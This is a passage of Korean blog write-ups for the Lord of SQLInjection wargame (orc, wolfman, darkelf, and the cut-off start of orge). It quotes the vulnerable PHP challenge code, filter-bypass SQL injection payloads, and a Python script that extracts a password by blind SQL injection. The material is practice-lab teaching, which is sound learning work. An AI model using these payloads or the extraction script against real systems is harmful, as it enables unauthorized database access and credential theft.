<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello admin&lt;/h2&gt;&quot;</span>; </span><br><span class="line">   </span><br><span class="line">  <span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select pw from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;orc&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello admin&lt;/h2&gt;&quot;</span>; </span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select pw from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;orc&quot;</span>); </span><br></pre></td></tr></table></figure>

<p><code>조건문</code>과 <code>query문</code>, <code>addslashes 함수</code>, <code>pw</code> 변수 값과 <code>GET으로 받아온 pw 파라미터 값</code>이 같아야 한다는 <code>조건문</code>이 있습니다.</p>
<br>

<br>

<h2 id="첫번째-줄-해석"><a href="#첫번째-줄-해석" class="headerlink" title="첫번째 줄 해석"></a>첫번째 줄 해석</h2><p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p><code>prob</code>문자열과 특수문자 <code>_</code> <code>.</code> <code>()</code> 를 필터링 하고있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="두번째-amp-세번째-amp-네번째-줄-해석"><a href="#두번째-amp-세번째-amp-네번째-줄-해석" class="headerlink" title="두번째 &amp; 세번째 &amp; 네번째 줄 해석"></a>두번째 &amp; 세번째 &amp; 네번째 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello admin&lt;/h2&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>prob_orc</code> 테이블에서 <code>id</code>가 <code>admin</code>이고 <code>pw</code>가 참이면 <code>id</code> 값을 <code>query</code>변수에 저장하고 있습니다.</p>
<p>만약 <code>result[&#39;id&#39;]</code>가 있다면 Hello admin을 출력시킵니다.</p>
<br>

<br>

<h2 id="여섯번째-줄-해석"><a href="#여섯번째-줄-해석" class="headerlink" title="여섯번째 줄 해석"></a>여섯번째 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[pw] = addslashes(<span class="variable">$_GET</span>[pw]);</span><br></pre></td></tr></table></figure>

<p><code>addslashes</code>함수는 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code> 같은 특수 문자들을 포함하고 있는 문자열에 <code>\</code>을 넣음으로써 쿼리문에서의 오류를 없애줍니다.</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">예) pw 가 passwd&#x27;s 이면</span><br><span class="line">   </span><br><span class="line">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;passwd&#x27;s&#x27;&quot; → 오류</span><br><span class="line">&quot;select id from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;passwd\&#x27;s&#x27;&quot; → &#x27;를 \&#x27;로 바꿔줍니다</span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="일곱번째-amp-여덟번째-amp-아홉번째-줄-해석"><a href="#일곱번째-amp-여덟번째-amp-아홉번째-줄-해석" class="headerlink" title="일곱번째 &amp; 여덟번째 &amp; 아홉번째 줄 해석"></a>일곱번째 &amp; 여덟번째 &amp; 아홉번째 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select pw from prob_orc where id=&#x27;admin&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>]) &amp;&amp; (<span class="variable">$result</span>[<span class="string">&#x27;pw&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>])) solve(<span class="string">&quot;orc&quot;</span>); </span><br></pre></td></tr></table></figure>

<p><code>addslashes</code>함수로 <code>&#39;</code>, <code>&quot;</code>, <code>NULL</code>을 필터링 한 쿼리문을 다시 실행시키고 <code>result[&#39;pw&#39;]</code>값과 <code>GET 으로 받은 pw 파라미터</code> 값이 같으면 문제가 풀립니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<img src="/images/Lord of SQLInjection/orc/solve_1.png">

<br>

<p><code>pw</code> 파라미터를 참으로 만들어주니 Hello admin이 출력되었습니다.</p>
<p>이제 중간에 <code>addslashes</code>함수를 우회하고 <code>result[&#39;pw&#39;]</code> 값을 알아내야합니다.</p>
<br>

<br>

<p><code>pw</code>를 알아내기 위해 <code>Blind SQL Injection</code>을 사용하였습니다.</p>
<br>

<p><code>?pw=1&#39; or id=&#39;admin&#39; and length(pw)=&#39;1</code><br>MySQL의 <code>length</code> 함수를 사용하여 길이를 구해줍니다.</p>
<br>

<p><code>?pw=1&#39; or id=&#39;admin&#39; and substring(pw,1,1)=&#39;0</code><br>MySQL의 <code>substring</code> 함수를 사용하여 <code>pw</code>를 하나 씩 추출하여 참인지 확인해야 합니다.</p>
<br>

<blockquote>
<p><code>substring(str, pos, len)</code> 함수의 인자를 설명하겠습니다.</p>
<p><code>str</code> : 원본 문자열</p>
<p><code>pos</code> : 시작 위치 값</p>
<p><code>len</code> : 가져올 길이 값</p>
</blockquote>
<br>

<p>예를 들어 <code>substring(pw, 1, 1)</code> 이면 <code>pw</code> 문자열에서 <code>첫번째 위치</code>에 있는 문자 <code>한 개</code> 추출해 오는 것 입니다.</p>
<br>

<p><code>pw</code>의 길이부터 <code>숫자 0~9</code>까지 <code>알파벳 대소문자 a~z</code>까지 하나 씩 구해야 하기 때문에 시간이 많이 소요됩니다.</p>
<p>파이썬을 통해 자동으로 빠르게 <code>pw</code>값을 추출할 수 있습니다.</p>
<br>

<br>

<h2 id="파이썬-코드"><a href="#파이썬-코드" class="headerlink" title="파이썬 코드"></a>파이썬 코드</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=1&#x27; or id=&#x27;admin&#x27; and &quot;</span></span><br><span class="line">head = &#123;<span class="string">&#x27;Cookie&#x27;</span> : <span class="string">&#x27;PHPSESSID=값&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line">pwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    query = <span class="string">&quot;length(pw)=&#x27;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(length)</span><br><span class="line">    req = requests.get(url+query, headers=head)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[ +&quot;</span>,length,<span class="string">&quot;]&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;총 길이는&quot;</span>,length)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        length = length + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>, <span class="number">122</span>):</span><br><span class="line">        query = <span class="string">&quot;substring(pw,&#123;&#125;,1) = &#x27;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(i),<span class="built_in">chr</span>(j))</span><br><span class="line">        req = requests.get(url+query, headers=head)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello admin&quot;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            <span class="built_in">print</span>(pwd)</span><br><span class="line">            pwd = pwd + <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line"><span class="built_in">print</span>(pwd)</span><br></pre></td></tr></table></figure>



<p>url을 적어 줍니다. <code>?pw=1&#39; or id=&#39;admin&#39; and </code>까지 동일하기 때문에 이 부분까지 작성하였습니다.</p>
<p>본 워게임 사이트는 로그인이 필요한 사이트이므로 쿠키 값을 head 변수에 넣어줬습니다.</p>
<br>

<p>먼저 <code>pw</code>의 길이를 구해줬습니다.</p>
<p>무한 루프를 돌려 “Hello admin” 이라는 문자열이 나올때까지 <code>length</code>값을 1씩 더해줍니다.</p>
<br>

<p><code>substring</code> 함수를 사용한 문자 추출은 중첩 반복문을 사용해 구해줬습니다.</p>
<p><code>i</code>는 <code>1 ~ length+1</code> 까지 돌아갑니다.</p>
<p><code>j</code>는 아스키코드 <code>48 ~ 122</code>까지 돌아갑니다.</p>
<br>

<img src="/images/Lord of SQLInjection/orc/solve_2.png">

<br>

<p>자동으로 <code>pw</code>의 길이를 구해 줍니다.</p>
<br>

<br>

<img src="/images/Lord of SQLInjection/orc/solve_3.png">

<br>

<p>자동으로 <code>pw</code>의 값을 구해 줍니다.</p>
<br>

<br>

<p>파이썬 코드를 돌려서 나온 <code>pw</code> 값을 넣어주면 문제가 풀립니다.</p>
<img src="/images/Lord of SQLInjection/orc/solve_4.png">

<br>

<p><code>substring</code>으로 4번째 문자를 추출해보면 &#x27;A&#x27; 대문자인데..? Clear가 안되어.. 소문자 &#x27;a&#x27;를 써주니 Clear 됐습니다!</p>
<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [5번_wolfman] Write UP</title>
    <url>/2021/10/02/2021-10-02-Lord_of_SQLInjection_5_wolfman/</url>
    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>

<p>5번 문제인 wolfman을 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/wolfman/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ /i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No whitespace ~_~&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_wolfman where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;wolfman&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ /i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No whitespace ~_~&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_wolfman where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;  </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;wolfman&quot;</span>); </span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="첫번째-amp-두번째-줄-해석"><a href="#첫번째-amp-두번째-줄-해석" class="headerlink" title="첫번째 &amp; 두번째 줄 해석"></a>첫번째 &amp; 두번째 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ /i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No whitespace ~_~&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p><code>prob</code>문자열과 특수문자 <code>_</code> <code>.</code> <code>()</code> <code>공백</code> 을 필터링 하고있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<br>

<br>

<h2 id="세번째줄-amp-다섯번째-줄-해석"><a href="#세번째줄-amp-다섯번째-줄-해석" class="headerlink" title="세번째줄 &amp; 다섯번째 줄 해석"></a>세번째줄 &amp; 다섯번째 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_wolfman where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;  </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;wolfman&quot;</span>); </span><br></pre></td></tr></table></figure>

<p>쿼리문을 보면 <code>id</code>에 guest가 고정으로 적혀있고 <code>pw</code>만 파라미터로 받고 있습니다.</p>
<p>마지막 줄 조건문을 보면 <code>id</code>가 admin 이어야 한다는 조건이 있습니다.</p>
<p>즉, <code>pw</code> 파라미터를 통해 쿼리문을 조작해야 합니다.</p>
<br>

<br>

<hr>
<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<img src="/images/Lord of SQLInjection/wolfman/solve_1.png">

<br>

<p><code>preg_match</code> 함수로 공백을 필터링 하고 있기 때문에 <code>%09 (Tab)</code>으로 공백을 우회하였습니다.</p>
<p><code>?pw=2&#39;%09or%09id=&#39;admin</code> 을 적으니 문제가 풀렸습니다.</p>
<br>

<p><code>%09</code>외 <code>%0a (\n, Line Feed)</code>, <code>%0d (\r, Carrage Return)</code>, <code>/**/ (주석)</code> 등 으로 우회가 가능합니다.</p>
<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [6번_darkelf] Write UP</title>
    <url>/2021/10/02/2021-10-02-Lord_of_SQLInjection_6_darkelf/</url>
    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>

<p>6번 문제인 darkelf을 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/darkelf/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect();  </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/or|and/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_darkelf where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>; </span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;query : &lt;strong&gt;<span class="subst">&#123;$query&#125;</span>&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;&quot;</span>; </span><br><span class="line">  <span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>]) <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;Hello <span class="subst">&#123;$result[id]&#125;</span>&lt;/h2&gt;&quot;</span>; </span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;darkelf&quot;</span>); </span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<hr>
<br>

<h1 id="🔔-중요-소스코드-해석"><a href="#🔔-중요-소스코드-해석" class="headerlink" title="🔔 중요 소스코드 해석"></a>🔔 중요 소스코드 해석</h1><br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/or|and/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_darkelf where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;  </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;darkelf&quot;</span>); </span><br></pre></td></tr></table></figure>

<br>

<br>

<h2 id="첫번째-amp-두번째-줄-해석"><a href="#첫번째-amp-두번째-줄-해석" class="headerlink" title="첫번째 &amp; 두번째 줄 해석"></a>첫번째 &amp; 두번째 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/or|and/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>preg_match</code>라는 함수가 있습니다.</p>
<p><code>preg_match</code>함수는 특정한 문자를 필터링할 때 사용합니다.</p>
<p><code>prob</code>, <code>or</code>, <code>and</code> 문자열과 특수문자 <code>_</code> <code>.</code> <code>()</code> 를 필터링 하고있습니다. <code>/i</code>는 대소문자를 구분하지 않는다는 뜻입니다.</p>
<br>

<br>

<h2 id="세번째줄-amp-다섯번째-줄-해석"><a href="#세번째줄-amp-다섯번째-줄-해석" class="headerlink" title="세번째줄 &amp; 다섯번째 줄 해석"></a>세번째줄 &amp; 다섯번째 줄 해석</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;select id from prob_darkelf where id=&#x27;guest&#x27; and pw=&#x27;<span class="subst">&#123;$_GET[pw]&#125;</span>&#x27;&quot;</span>;  </span><br><span class="line"><span class="variable">$result</span> = @mysqli_fetch_array(mysqli_query(<span class="variable">$db</span>,<span class="variable">$query</span>)); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;id&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>) solve(<span class="string">&quot;darkelf&quot;</span>);  </span><br></pre></td></tr></table></figure>

<p>쿼리문을 보면 <code>id</code>에 guest가 고정으로 적혀있고 <code>pw</code>만 파라미터로 받고 있습니다.</p>
<p>마지막 줄 조건문을 보면 <code>id</code>가 admin 이어야 한다는 조건이 있습니다.</p>
<p>즉, <code>pw</code> 파라미터를 통해 쿼리문을 조작해야 합니다.</p>
<br>

<br>

<hr>
<h1 id="🙆‍♀️-SOLVE"><a href="#🙆‍♀️-SOLVE" class="headerlink" title="🙆‍♀️ SOLVE"></a>🙆‍♀️ SOLVE</h1><br>

<img src="/images/Lord of SQLInjection/darkelf/solve_1.png">

<br>

<p><code>preg_match</code> 함수로 <code>or</code>, <code>and</code> 문자열을 필터링 하고 있기 때문에 <code>|| (or)</code>으로 공백을 우회하였습니다.</p>
<p><code>?pw=2&#39; || id=&#39;admin</code> 을 적으니 문제가 풀렸습니다.</p>
<br>

<blockquote>
<p>SOLVED !!!</p>
</blockquote>
]]></content>
      <categories>
        <category>Lord of SQLInjection</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>Write UP</tag>
      </tags>
  </entry>
  <entry>
    <title>[Lord of SQLInjection] [7번_orge] Write UP</title>
    <url>/2021/10/02/2021-10-02-Lord_of_SQLInjection_7_orge/</url>
    <content><![CDATA[<h1 id="🎨-전체-소스코드"><a href="#🎨-전체-소스코드" class="headerlink" title="🎨 전체 소스코드"></a>🎨 전체 소스코드</h1><br>

<p>7번 문제인 orge를 클릭하면 아래와 같이 소스코드와 쿼리문이 나옵니다.</p>
<br>

<img src="/images/Lord of SQLInjection/orge/source.png">

<br>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="keyword">include</span> <span class="string">&quot;./config.php&quot;</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  <span class="variable">$db</span> = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/prob|_|\.|\(\)/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;No Hack ~_~&quot;</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/or|and/i&#x27;</span>, <span class="variable">$_GET</span>[pw])) <span class="keyword">exit</span>(<span class="string">&quot;HeHe&quot;</span>); </span><br><span class="line">  <span class="variable">$query</span> = <span class="string">&quot;select id from prob_orge where id=&#x27;guest&#x27; and pw=&#x27;<span 